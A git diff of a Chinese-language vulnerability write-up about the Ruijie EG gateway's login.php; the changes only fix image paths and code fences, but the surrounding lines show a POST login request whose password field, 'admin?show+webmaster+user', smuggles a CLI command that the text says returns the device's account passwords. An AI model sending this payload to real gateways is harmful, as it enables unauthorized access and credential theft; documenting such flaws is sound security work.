@@ -20,7 +20,7 @@ app="Ruijie-EG易网关"
 
 登录页面如下
 
-![](images/202202110926402.png)
+![](../.gitbook/assets/202202110926402.png)
 
 漏洞文件 login.php
 
@@ -97,7 +97,7 @@ include_once(AROOT . "init.php");    //mvc初始化入口，放在底部
 
 关键代码部分
 
-```plain
+```
 if ($username == FALSE || $password == FALSE) {
             $data["status"] = 5;
             $data["msg"] = "username or password can't empty";
@@ -114,7 +114,7 @@ if ($username == FALSE || $password == FALSE) {
 
 发送请求包，拼接 CLI指令 **show webmaster user**
 
-```plain
+```
 POST /login.php HTTP/1.1
 Host: 
 User-Agent: Go-http-client/1.1
@@ -126,7 +126,7 @@ Accept-Encoding: gzip
 username=admin&password=admin?show+webmaster+user
 ```
 
-![](images/202202110926492.png)
+![](../.gitbook/assets/202202110926492.png)
 
 成功获取账号密码
 
